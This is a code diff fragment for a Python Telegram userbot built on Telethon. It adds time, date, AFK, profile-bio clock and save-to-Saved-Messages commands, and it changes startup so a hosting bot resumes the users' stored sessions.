+        await event.edit(f"🕒 **Time:** `{datetime.now().strftime('%I:%M:%S %p')}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.date$', outgoing=True))
+    async def date_cmd(event):
+        await event.edit(f"📅 **Date:** `{datetime.now().strftime('%d %B %Y')}`")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.afk\b', outgoing=True))
+    async def afk_cmd(event):
+        parts = event.raw_text.split(maxsplit=1)
+        reason = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "Busy"
+        afk_status[owner_id] = reason
+        await event.edit(f"💤 **AFK ON:** `{reason}`")
+
+    async def _timebio_loop():
+        try:
+            while True:
+                now_str = datetime.now().strftime("%I:%M %p")
+                try:
+                    await ubot(UpdateProfileRequest(about=f"{BOT_BRAND} | {now_str}"))
+                except Exception:
+                    pass
+                await asyncio.sleep(60)
+        except asyncio.CancelledError:
+            pass
+
+    @ubot.on(events.NewMessage(pattern=r'^\.timebio\s+(on|off)$', outgoing=True))
+    async def timebio_cmd(event):
+        st = event.pattern_match.group(1).lower()
+        t = timebio_tasks.pop(owner_id, None)
+        if t:
+            t.cancel()
+        if st == "on":
+            timebio_tasks[owner_id] = asyncio.create_task(_timebio_loop())
+            await event.edit("🕒 **TimeBio ON.**")
+        else:
+            await event.edit("🕒 **TimeBio OFF.**")
+
+    @ubot.on(events.NewMessage(pattern=r'^\.(save|save2)$', outgoing=True))
+    async def save_cmd(event):
+        if not event.is_reply:
+            await event.edit("ℹ️ **Kisi message ya media par reply karke `.save` likhein.**")
+            return
+        rep = await event.get_reply_message()
+        try:
+            await ubot.send_message("me", rep)
+            await event.edit("💾 **Saved Messages mein save ho gaya.**")
+        except Exception as e:
+            await event.edit(f"❌ **Save fail:** `{e}`")
 
     await ubot.start()
-    print(f"{BOT_BRAND} session started for owner ID: {owner_id}")
+    print(f"[{BOT_BRAND}] Userbot active for owner_id={owner_id}", flush=True)
     await ubot.run_until_disconnected()
 
-# MAIN ENTRY POINT
-if __name__ == '__main__':
-    for uid, s_str in list(user_sessions.items()):
-        try:
-            loop.create_task(start_userbot_session(s_str, int(uid)))
-        except Exception:
-            pass
-    print(f"{BOT_BRAND} started successfully for {OWNER_NAME}. Ready for connections!")
-    bot.run_until_disconnected()
+async def _resume_all_saved_sessions():
+    await asyncio.sleep(2)
+    for uid_str, s_str in list(user_sessions.items()):
+        if s_str:
+            try:
+                asyncio.create_task(start_userbot_session(s_str, int(uid_str)))
+            except Exception as e:
+                print(f"Resume error for {uid_str}: {e}", flush=True)
+
+loop.create_task(_resume_all_saved_sessions())
+print(f"[{BOT_BRAND}] Hosting bot running...", flush=True)
+bot.run_until_disconnected()
